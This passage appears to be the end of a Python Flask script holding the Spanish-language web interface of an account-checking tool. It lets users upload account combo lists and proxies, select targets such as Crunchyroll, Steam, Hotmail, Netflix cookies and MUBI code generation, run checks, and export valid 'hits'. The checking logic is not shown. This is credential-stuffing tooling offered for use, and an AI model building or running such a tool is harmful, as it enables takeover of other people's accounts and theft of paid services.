    </header>

    <!-- ===== MAIN ===== -->
    <div class="main">
        <!-- ===== COLUMNA IZQUIERDA ===== -->
        <div>
            <!-- Configuración -->
            <div class="card">
                <div class="card-title">
                    ⚙️ Configuración
                    <span class="badge" id="accountsCount">0 cuentas</span>
                </div>
                
                <div class="form-group">
                    <label>📌 Seleccionar Checker</label>
                    <div class="checker-selector">
                        <div class="checker-option active" data-checker="crunchyroll" onclick="selectChecker(this)">
                            <div class="icon">🍥</div>
                            <div class="name">Crunchyroll</div>
                            <div class="desc">Premium</div>
                            <span class="status-dot dot-idle" id="dot-crunchyroll"></span>
                        </div>
                        <div class="checker-option" data-checker="paramount" onclick="selectChecker(this)">
                            <div class="icon">🎬</div>
                            <div class="name">Paramount+</div>
                            <div class="desc">Streaming</div>
                            <span class="status-dot dot-idle" id="dot-paramount"></span>
                        </div>
                        <div class="checker-option" data-checker="hotmail" onclick="selectChecker(this)">
                            <div class="icon">📧</div>
                            <div class="name">Hotmail</div>
                            <div class="desc">Inbox</div>
                            <span class="status-dot dot-idle" id="dot-hotmail"></span>
                        </div>
                        <div class="checker-option" data-checker="steam" onclick="selectChecker(this)">
                            <div class="icon">🎮</div>
                            <div class="name">Steam</div>
                            <div class="desc">Games</div>
                            <span class="status-dot dot-idle" id="dot-steam"></span>
                        </div>
                        <div class="checker-option" data-checker="minecraft" onclick="selectChecker(this)">
                            <div class="icon">⛏️</div>
                            <div class="name">Minecraft</div>
                            <div class="desc">Microsoft</div>
                            <span class="status-dot dot-idle" id="dot-minecraft"></span>
                        </div>
                        <div class="checker-option" data-checker="netflix" onclick="selectChecker(this)">
                            <div class="icon">🎬</div>
                            <div class="name">Netflix</div>
                            <div class="desc">Cookies</div>
                            <span class="status-dot dot-idle" id="dot-netflix"></span>
                        </div>
                        <div class="checker-option" data-checker="mubi" onclick="selectChecker(this)">
                            <div class="icon">🎥</div>
                            <div class="name">MUBI</div>
                            <div class="desc">Gen Codes</div>
                            <span class="status-dot dot-idle" id="dot-mubi"></span>
                        </div>
                        <div class="checker-option" data-checker="crunchyroll_v2" onclick="selectChecker(this)">
                            <div class="icon">🍥</div>
                            <div class="name">CR V2</div>
                            <div class="desc">Threads</div>
                            <span class="status-dot dot-idle" id="dot-crunchyroll_v2"></span>
                        </div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>📄 Archivo de entrada</label>
                    <input type="file" id="inputFile" accept=".txt,.json" onchange="uploadFile()">
                    <div id="uploadStatus" class="upload-status upload-waiting">Esperando archivo...</div>
                </div>
                
                <div class="form-group">
                    <label>🌐 Proxies (opcional)</label>
                    <input type="file" id="proxyFile" accept=".txt" onchange="uploadProxy()">
                    <div id="proxyStatus" class="upload-status upload-waiting">Esperando archivo...</div>
                </div>
                
                <div class="btn-group">
                    <button class="btn btn-primary" id="btnStart" onclick="startChecker()">▶ Iniciar</button>
                    <button class="btn btn-danger" id="btnStop" onclick="stopChecker()" disabled>⏹ Detener</button>
                    <button class="btn btn-success" id="btnExport" onclick="exportHits()">💾 Exportar</button>
                    <button class="btn btn-secondary" onclick="clearLogs()">🗑 Logs</button>
                    <button class="btn btn-secondary" onclick="clearHits()">🗑 Hits</button>
                </div>
            </div>
            
            <!-- Estadísticas -->
            <div class="card" style="margin-top:12px;">
                <div class="card-title">
                    📊 Estadísticas
                    <span class="badge" id="progressText">0%</span>
                </div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value stat-total" id="statTotal">0</div>
                        <div class="stat-label">Total</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="statProcessed">0</div>
                        <div class="stat-label">Procesadas</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value stat-hit" id="statHits">0</div>
                        <div class="stat-label">✅ Hits</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value stat-invalid" id="statInvalid">0</div>
                        <div class="stat-label">❌ Invalid</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value stat-error" id="statErrors">0</div>
                        <div class="stat-label">⚠️ Errors</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="statSpeed">0</div>
                        <div class="stat-label">📈 /min</div>
                    </div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
            </div>
        </div>
        
        <!-- ===== COLUMNA DERECHA ===== -->
        <div>
            <!-- Logs -->
            <div class="card">
                <div class="card-title">
                    📜 Logs
                    <span class="badge" id="logCount">(0)</span>
                </div>
                <div class="log-container" id="logContainer">
                    <div class="log-line log-info">[INFO] 🚀 Esperando inicio...</div>
                </div>
            </div>
            
            <!-- Hits -->
            <div class="card" style="margin-top:12px;">
                <div class="card-title">
                    🏆 Hits
                    <span class="badge" id="hitCount">(0)</span>
                </div>
                <div class="hits-container" id="hitsContainer">
                    <div class="empty-state">
                        <div class="icon">🎯</div>
                        <div class="text">Esperando hits...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== SCRIPTS ===== -->
    <script>
        // ===== VARIABLES =====
        let currentChecker = 'crunchyroll';
        let fileContent = '';
        let proxyContent = '';
        let isRunning = false;
        let statusInterval = null;
        let timerInterval = null;
        let speedInterval = null;
        let elapsedSeconds = 0;
        let lastProcessed = 0;

        // ===== SELECTOR DE CHECKER =====
        function selectChecker(el) {
            if (isRunning) {
                alert('⚠️ Detén el checker antes de cambiar.');
                return;
            }
            document.querySelectorAll('.checker-option').forEach(c => c.classList.remove('active'));
            el.classList.add('active');
            currentChecker = el.dataset.checker;
            updateCheckerDots();
            
            // Actualizar badge
            const names = {
                'crunchyroll': 'Crunchyroll',
                'crunchyroll_v2': 'Crunchyroll V2',
                'paramount': 'Paramount+',
                'hotmail': 'Hotmail',
                'steam': 'Steam',
                'minecraft': 'Minecraft',
                'netflix': 'Netflix Cookies',
                'mubi': 'MUBI Gen'
            };
            document.getElementById('statusText').textContent = `Seleccionado: ${names[currentChecker] || currentChecker}`;
            document.getElementById('statusText').style.color = '#E4751E';
            document.getElementById('statusLed').className = 'led led-yellow';
        }

        function updateCheckerDots() {
            document.querySelectorAll('.checker-option').forEach(c => {
                const dot = c.querySelector('.status-dot');
                if (c.classList.contains('active')) {
                    dot.className = 'status-dot dot-idle';
                } else {
                    dot.className = 'status-dot dot-idle';
                }
            });
        }

        // ===== SUBIDA DE ARCHIVOS =====
        async function uploadFile() {
            const input = document.getElementById('inputFile');
            const status = document.getElementById('uploadStatus');
            
            if (!input.files || !input.files[0]) return;
            
            const file = input.files[0];
            const formData = new FormData();
            formData.append('file', file);
            formData.append('type', 'accounts');
            
            status.style.display = 'block';
            status.className = 'upload-status';
            status.textContent = '⏳ Subiendo...';
            
            try {
                const response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                if (data.success) {
                    status.className = 'upload-status upload-success';
                    status.textContent = `✅ ${data.count} cuentas cargadas`;
                    fileContent = data.content || '';
                    document.getElementById('accountsCount').textContent = `${data.count} cuentas`;
                } else {
                    status.className = 'upload-status upload-error';
                    status.textContent = `❌ ${data.error || 'Error al subir'}`;
                }
            } catch (e) {
                status.className = 'upload-status upload-error';
                status.textContent = `❌ Error: ${e.message}`;
            }
        }

        async function uploadProxy() {
            const input = document.getElementById('proxyFile');
            const status = document.getElementById('proxyStatus');
            
            if (!input.files || !input.files[0]) return;
            
            const file = input.files[0];
            const formData = new FormData();
            formData.append('file', file);
            formData.append('type', 'proxies');
            
            status.style.display = 'block';
            status.className = 'upload-status';
            status.textContent = '⏳ Subiendo...';
            
            try {
                const response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                if (data.success) {
                    status.className = 'upload-status upload-success';
                    status.textContent = `✅ ${data.count} proxies cargados`;
                    proxyContent = data.content || '';
                } else {
                    status.className = 'upload-status upload-error';
                    status.textContent = `❌ ${data.error || 'Error al subir'}`;
                }
            } catch (e) {
                status.className = 'upload-status upload-error';
                status.textContent = `❌ Error: ${e.message}`;
            }
        }

        // ===== INICIAR CHECKER =====
        async function startChecker() {
            if (isRunning) return;
            
            if (!fileContent) {
                alert('⚠️ Carga un archivo de entrada primero.');
                return;
            }
            
            const btn = document.getElementById('btnStart');
            btn.disabled = true;
            btn.textContent = '⏳ Iniciando...';
            
            try {
                const response = await fetch('/api/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        checker: currentChecker,
                        content: fileContent,
                        proxies: proxyContent
                    })
                });
                const data = await response.json();
                
                if (data.success) {
                    isRunning = true;
                    document.getElementById('btnStart').disabled = true;
                    document.getElementById('btnStop').disabled = false;
                    document.getElementById('statusText').textContent = '▶ Ejecutando';
                    document.getElementById('statusText').style.color = '#00cc88';
                    document.getElementById('statusLed').className = 'led led-green';
                    
                    document.querySelectorAll('.checker-option').forEach(c => {
                        const dot = c.querySelector('.status-dot');
                        if (c.dataset.checker === currentChecker) {
                            dot.className = 'status-dot dot-running';
                        }
                    });
                    
                    elapsedSeconds = 0;
                    lastProcessed = 0;
                    
                    if (statusInterval) clearInterval(statusInterval);
                    if (timerInterval) clearInterval(timerInterval);
                    if (speedInterval) clearInterval(speedInterval);
                    
                    statusInterval = setInterval(fetchStatus, 800);
                    timerInterval = setInterval(updateTimer, 1000);
                    speedInterval = setInterval(updateSpeed, 2000);
                    
                    document.getElementById('logContainer').innerHTML = '';
                    document.getElementById('hitsContainer').innerHTML = '';
                    document.getElementById('statTotal').textContent = data.total || 0;
                } else {
                    alert('❌ ' + (data.error || 'Error al iniciar'));
                }
            } catch (e) {
                alert('❌ Error: ' + e.message);
            }
            
            btn.disabled = false;
            btn.textContent = '▶ Iniciar';
        }

        // ===== DETENER CHECKER =====
        async function stopChecker() {
            if (!isRunning) return;
            
            try {
                const response = await fetch('/api/stop', { method: 'POST' });
                const data = await response.json();
                
                if (data.success) {
                    isRunning = false;
                    document.getElementById('btnStart').disabled = false;
                    document.getElementById('btnStop').disabled = true;
                    document.getElementById('statusText').textContent = '⏹ Detenido';
                    document.getElementById('statusText').style.color = '#ff4444';
                    document.getElementById('statusLed').className = 'led led-red';
                    
                    document.querySelectorAll('.checker-option').forEach(c => {
                        const dot = c.querySelector('.status-dot');
                        dot.className = 'status-dot dot-idle';
                    });
                    
                    if (statusInterval) clearInterval(statusInterval);
                    if (timerInterval) clearInterval(timerInterval);
                    if (speedInterval) clearInterval(speedInterval);
                }
            } catch (e) {
                alert('Error: ' + e.message);
            }
        }

        // ===== EXPORTAR HITS =====
        async function exportHits() {
            try {
                const response = await fetch('/api/export');
                if (response.ok) {
                    const blob = await response.blob();
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = response.headers.get('Content-Disposition')?.split('filename=')[1] || 'hits_export.txt';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                } else {
                    const data = await response.json();
                    alert('❌ ' + (data.error || 'Error al exportar'));
                }
            } catch (e) {
                alert('Error: ' + e.message);
            }
        }

        // ===== LIMPIAR LOGS =====
        async function clearLogs() {
            try {
                await fetch('/api/clear_logs', { method: 'POST' });
                document.getElementById('logContainer').innerHTML = '<div class="log-line log-info">[INFO] Logs limpiados</div>';
                document.getElementById('logCount').textContent = '(0)';
            } catch (e) {
                console.error(e);
            }
        }

        // ===== LIMPIAR HITS =====
        async function clearHits() {
            try {
                await fetch('/api/clear_hits', { method: 'POST' });
                document.getElementById('hitsContainer').innerHTML = `
                    <div class="empty-state">
                        <div class="icon">🎯</div>
                        <div class="text">Hits limpiados</div>
                    </div>
                `;
                document.getElementById('hitCount').textContent = '(0)';
            } catch (e) {
                console.error(e);
            }
        }

        // ===== ACTUALIZAR ESTADO =====
        async function fetchStatus() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();
                
                document.getElementById('statProcessed').textContent = data.processed || 0;
                document.getElementById('statHits').textContent = data.hits || 0;
                document.getElementById('statInvalid').textContent = data.invalid || 0;
                document.getElementById('statErrors').textContent = data.errors || 0;
                
                const progress = data.total > 0 ? Math.round((data.processed / data.total) * 100) : 0;
                document.getElementById('progressText').textContent = progress + '%';
                document.getElementById('progressFill').style.width = progress + '%';
                
                // Logs
                if (data.logs && data.logs.length) {
                    const container = document.getElementById('logContainer');
                    const lastLogs = data.logs.slice(-30);
                    container.innerHTML = lastLogs.map(log => {
                        let className = 'log-info';
                        if (log.includes('[HIT]')) className = 'log-hit';
                        else if (log.includes('[FREE]')) className = 'log-free';
                        else if (log.includes('[INVALID]')) className = 'log-invalid';
                        else if (log.includes('[ERROR]')) className = 'log-error';
                        else if (log.includes('[2FA]')) className = 'log-2fa';
                        else if (log.includes('[CUSTOM]')) className = 'log-custom';
                        else if (log.includes('[BAN]')) className = 'log-ban';
                        return `<div class="log-line ${className}">${escapeHtml(log)}</div>`;
                    }).join('');
                    container.scrollTop = container.scrollHeight;
                    document.getElementById('logCount').textContent = `(${data.logs.length})`;
                }
                
                // Hits
                if (data.results && data.results.length) {
                    const container = document.getElementById('hitsContainer');
                    const hits = data.results.slice(-15);
                    if (hits.length > 0) {
                        container.innerHTML = hits.map(hit => {
                            const email = hit.email || hit.code || 'Unknown';
                            const plan = hit.plan || hit.type || hit.tipo || 'Unknown';
                            const extra = hit.country || hit.days || '';
                            return `<div class="hit-item">✅ ${email} | <span class="badge-plan">${plan}</span> ${extra ? '| '+extra : ''}</div>`;
                        }).join('');
                    }
                    document.getElementById('hitCount').textContent = `(${data.hits || 0})`;
                }
                
                // Actualizar running state
                if (!data.running && isRunning) {
                    isRunning = false;
                    document.getElementById('btnStart').disabled = false;
                    document.getElementById('btnStop').disabled = true;
                    document.getElementById('statusText').textContent = '✅ Finalizado';
                    document.getElementById('statusText').style.color = '#ffaa44';
                    document.getElementById('statusLed').className = 'led led-yellow';
                    
                    document.querySelectorAll('.checker-option').forEach(c => {
                        const dot = c.querySelector('.status-dot');
                        if (c.dataset.checker === currentChecker) {
                            dot.className = 'status-dot dot-done';
                        }
                    });
                    
                    if (statusInterval) clearInterval(statusInterval);
                    if (timerInterval) clearInterval(timerInterval);
                    if (speedInterval) clearInterval(speedInterval);
                }
                
                elapsedSeconds = data.elapsed || 0;
                
            } catch (e) {
                console.error('Error fetching status:', e);
            }
        }

        // ===== TIMER =====
        function updateTimer() {
            elapsedSeconds++;
            const hours = String(Math.floor(elapsedSeconds / 3600)).padStart(2, '0');
            const minutes = String(Math.floor((elapsedSeconds % 3600) / 60)).padStart(2, '0');
            const seconds = String(elapsedSeconds % 60).padStart(2, '0');
            document.getElementById('timerDisplay').textContent = `${hours}:${minutes}:${seconds}`;
        }

        // ===== SPEED =====
        function updateSpeed() {
            const processed = parseInt(document.getElementById('statProcessed').textContent) || 0;
            const speed = Math.round((processed - lastProcessed) * 30);
            document.getElementById('statSpeed').textContent = speed > 0 ? speed : 0;
            lastProcessed = processed;
        }

        // ===== UTILS =====
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // ===== POLLING INICIAL =====
        setTimeout(() => {
            fetchStatus();
        }, 1000);
    </script>
</body>
</html>
'''

# ============================================
# PUNTO DE ENTRADA
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)